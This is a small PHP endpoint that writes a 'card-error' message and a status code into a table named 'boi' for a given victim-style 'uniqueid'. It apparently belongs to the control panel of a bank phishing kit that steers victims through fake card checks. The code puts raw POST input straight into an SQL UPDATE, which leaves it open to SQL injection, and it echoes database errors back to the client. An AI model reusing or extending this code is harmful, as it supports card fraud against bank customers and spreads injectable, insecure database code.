<?php
require '../connection.php';

if ($_POST["card-error"] and $_POST["uniqueid"]) {
  $uniqueid = $_POST["uniqueid"];
  $carderror = $_POST["card-error"];


  $verification_query = mysqli_query($conn, "UPDATE boi SET `card-error`='$carderror', status=9, viewed='false' WHERE uniqueid=$uniqueid");


  if ($verification_query) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}
?>
